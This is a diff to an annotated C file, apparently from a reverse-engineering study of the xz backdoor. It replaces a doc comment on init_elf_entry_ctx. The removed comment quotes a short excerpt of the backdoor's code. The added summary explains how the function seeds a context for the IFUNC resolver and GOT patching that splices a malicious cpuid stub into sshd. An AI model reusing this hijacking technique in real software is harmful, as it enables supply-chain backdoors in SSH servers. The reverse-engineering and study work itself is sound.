@@ -3,27 +3,11 @@
 // Calling convention: __stdcall
 // Prototype: void __stdcall init_elf_entry_ctx(elf_entry_ctx_t * ctx)
 /*
- * AutoDoc: Generated from upstream sources.
- *
- * Source summary (xzre/xzre.h):
- *   @brief initialises the elf_entry_ctx_t
- *
- *   stores the address of the symbol cpuid_random_symbol in elf_entry_ctx_t::symbol_ptr
- *   stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so
- *   calls update_got_offset() to update elf_entry_ctx_t::got_offset
- *   calls update_cpuid_got_index() to update @ref elf_entry_ctx_t.got_ctx.cpuid_fn
- *
- *   @param ctx
- *
- * Upstream implementation excerpt (xzre/xzre_code/init_elf_entry_ctx.c):
- *     void init_elf_entry_ctx(elf_entry_ctx_t *ctx){
- *     	ctx->symbol_ptr = (void *)&cpuid_random_symbol;
- *     	ctx->got_ctx.return_address = (void *)ctx->frame_address[3];
- *     	update_got_offset(ctx);
- *     	update_cpuid_got_index(ctx);
- *     	ctx->got_ctx.got_ptr = NULL;
- *     }
+ * AutoDoc: Seeds an `elf_entry_ctx_t` prior to running the IFUNC resolvers. It records the address of `cpuid_random_symbol`, captures the caller's return address from the saved frame (slot 3), recomputes the GOT offset via `update_got_offset`, primes the cpuid GOT index with `update_cpuid_got_index`, and clears the cached `got_ptr` so the resolver will refill it. The context is later consumed by the GOT patching code that splices the malicious cpuid stub into sshd.
  */
+
+#include "xzre_types.h"
+
 
 void init_elf_entry_ctx(elf_entry_ctx_t *ctx)
 
